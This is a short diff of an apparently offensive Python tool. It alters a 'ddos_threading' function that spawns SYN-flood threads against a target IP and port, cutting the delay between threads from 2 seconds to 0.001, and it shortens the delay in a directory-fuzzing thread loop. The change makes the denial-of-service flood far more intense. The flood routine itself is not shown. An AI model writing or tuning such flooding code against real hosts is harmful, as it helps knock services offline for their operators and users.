@@ -82,7 +82,7 @@ def ddos_threading():
     for i in range(counter):
         ddos_thread = threading.Thread(target=syn_flood, args=[dst_ip, dst_port], daemon=True)
         print(f'               {Fore.LB}[{i}]{Fore.W} Sent packet to {Fore.LIGHTYELLOW_EX}{dst_ip}:{dst_port}{Fore.W}')
-        time.sleep(2)
+        time.sleep(0.001)
         ddos_thread.start()
     print(f"\n               Total packets sent: {counter}\n")
 
@@ -273,7 +273,7 @@ def fuzz(directory):
 def threads_handler():
     for directory in dirs:
         fuzz_thread = threading.Thread(target=fuzz, args=(directory,), daemon=True)  # Starts the fuzzing thread
-        time.sleep(0.8)
+        time.sleep(0.5)
         fuzz_thread.start()
 
 
